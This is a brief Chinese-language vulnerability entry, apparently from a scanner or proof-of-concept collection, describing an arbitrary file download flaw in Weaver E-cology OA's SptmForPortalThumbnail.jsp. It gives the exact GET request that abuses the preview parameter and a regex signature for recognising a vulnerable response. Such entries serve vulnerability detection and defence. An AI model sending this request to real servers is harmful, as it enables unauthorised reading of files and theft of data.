# 泛微E-cologySptmForPortalThumbnail.jsp存在任意文件下载漏洞

泛微OA ｜ 其他 ｜ —
- **请求**：`GET /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp HTTP/1.1`
- **响应特征**：-1 ^(?=.*?java.io)(?=.*?imgFile.exists)(?=.*?Thumbnail).*?$